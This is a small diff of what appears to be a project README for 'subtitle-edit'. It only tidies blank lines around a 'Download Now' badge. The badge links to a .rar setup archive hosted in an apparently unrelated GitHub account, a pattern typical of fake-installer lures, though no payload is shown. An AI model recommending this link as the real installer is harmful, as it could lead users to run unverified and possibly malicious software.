@@ -11,11 +11,8 @@
 
 <img width="512" height="370,5" alt="Fd" src="https://github.com/user-attachments/assets/ac592585-0887-4a03-ac21-41fff926e1a9" />
 
- <br/> 
 
-
-
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/nucleusmotormancoil/subtitle-edit/releases/download/SubtitleEdit/SubtitleEdit-Setup.rar).
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/nucleusmotormancoil/subtitle-edit/releases/download/SubtitleEdit/SubtitleEdit-Setup.rar)
 
 
 </div>
